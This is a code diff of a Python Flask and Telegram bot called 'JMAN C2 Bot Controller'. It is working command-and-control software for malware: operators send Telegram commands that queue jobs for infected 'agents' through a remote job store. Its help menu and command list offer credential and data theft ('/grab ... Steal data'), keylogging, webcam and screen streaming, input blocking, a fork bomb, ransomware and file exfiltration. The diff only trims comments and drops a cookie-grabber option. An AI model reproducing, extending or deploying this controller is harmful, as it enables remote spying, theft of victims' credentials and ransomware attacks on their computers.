@@ -1,9 +1,6 @@
 #
 # JMAN C2 Bot Controller - FIXED & UPGRADED
-# - FIXED: Added missing /list, /target, and /destroy handlers.
-# - FIXED: Improved error handling for network requests.
-# - IMPROVED: Refactored async handling within Flask for better stability.
-# - UPDATED: Added /livecam, /stoplivecam, and updated /help menu.
+# - UPDATED: Removed 'cookies' command and updated /help menu for new grabber.
 #
 import os
 import re
@@ -21,7 +18,6 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
 
 # --- Configuration ---
-# Load these from your environment variables on your server (e.g., Vercel)
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
 JOBS_URL = os.getenv("JOBS_URL")
@@ -32,7 +28,8 @@ HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
-# --- Helper Functions ---
+# (The helper functions remain the same)
+# ...
 def esc(text):
     """Escapes characters for Telegram's MarkdownV2 parser."""
     escape_chars = r'_*[]()~`>#+-=|{}.!'
@@ -47,7 +44,7 @@ async def make_async_request(method, url, json_data=None, retries=3, delay=2):
                     res = await client.get(url, timeout=10)
                 elif method.upper() == 'POST':
                     res = await client.post(url, json=json_data, timeout=10)
-                res.raise_for_status() # Raise an exception for bad status codes (4xx or 5xx)
+                res.raise_for_status()
                 return res.json()
             except httpx.RequestError as e:
                 print(f"Attempt {attempt + 1}/{retries}: Network error for {url}: {e}")
@@ -72,22 +69,17 @@ async def post_job(target_id, command, args):
     """Appends a new job to the job queue."""
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
     
-    # Get the current list of jobs first
     current_jobs = await make_async_request('GET', JOBS_URL)
-    if current_jobs is None: # If fetching fails, start with an empty list
-        current_jobs = []
-    if not isinstance(current_jobs, list): # Ensure it's a list
+    if current_jobs is None: current_jobs = []
+    if not isinstance(current_jobs, list):
         print(f"Warning: Data at JOBS_URL is not a list. Resetting. Data: {current_jobs}")
         current_jobs = []
         
     current_jobs.append(job)
-    
-    # Post the updated list back
     return await make_async_request('POST', JOBS_URL, json_data=current_jobs)
 
-
-# --- Telegram Command Handlers ---
-
+# (Core command handlers like /list, /target, /destroy remain the same)
+# ...
 async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Lists all currently active agents based on the heartbeat data."""
     await update.message.reply_text("⏳ Fetching active agents...", parse_mode=ParseMode.MARKDOWN_V2)
@@ -99,7 +91,6 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No agents found or error fetching agent list.", parse_mode=ParseMode.MARKDOWN_V2)
         return
 
-    # Sort agents by timestamp, newest first
     agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
     
     response_text = "*ONLINE AGENTS*\n\n"
@@ -171,6 +162,7 @@ async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_
         await update.message.reply_text("❌ Error: Failed to dispatch job\\.", parse_mode=ParseMode.MARKDOWN_V2)
 
 
+# --- UPDATED: Help Command ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Displays the help menu."""
     help_text = (
@@ -213,8 +205,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/unblockmouse` \\- Enable mouse input\n\n"
 
         "*🔑 DATA EXFILTRATION*\n"
-        "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n"
-        "  *Types: all, passwords, cookies, history, discord, wifi*\n\n"
+        "`/grab <type>` \\- Steal data \\(passwords, etc\\.\\)\n"
+        "  *Types: all, passwords, history, discord, wifi*\n\n"
         
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files\n"
@@ -234,16 +226,15 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
 
 
-# --- Register all command handlers with the application ---
+# --- UPDATED: Agent Command List ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 
-# --- UPDATED: Added new agent commands ---
 agent_commands = [
     "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
-    "livestream", "stoplivestream", "livecam", "stoplivecam", # Added livecam commands
+    "livestream", "stoplivestream", "livecam", "stoplivecam",
     "grab", "ls", "cd", "download", "pwd",
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
     "forkbomb", "cancelforkbomb", "ransomware", "restore",
@@ -253,26 +244,18 @@ agent_commands = [
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
-
-# --- Main Webhook Endpoint ---
+# (The main webhook endpoint and async processing remain the same)
+# ...
 @app.route('/', methods=['POST'])
 def process_webhook():
-    """Main webhook endpoint that receives updates from Telegram."""
-    # First, verify the secret token to ensure the request is from Telegram
     if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
         return Response('Unauthorized', status=403)
-    
-    # Run the async processing function in a way that Flask understands
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
-    
     return Response('OK', status=200)
 
 async def process_update_async(update_data):
-    """Asynchronously process the update from Telegram."""
     try:
-        # The Application object needs to be initialized and shut down for each update
-        # when running in a serverless environment like Vercel.
         async with ptb_app:
             update = Update.de_json(update_data, ptb_app.bot)
             await ptb_app.process_update(update)
@@ -282,9 +265,7 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['GET'])
 def health_check():
-    """A simple endpoint to confirm the bot is running."""
     return "Bot is running.", 200
 
-# This part is useful for local testing but might not be used on Vercel
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
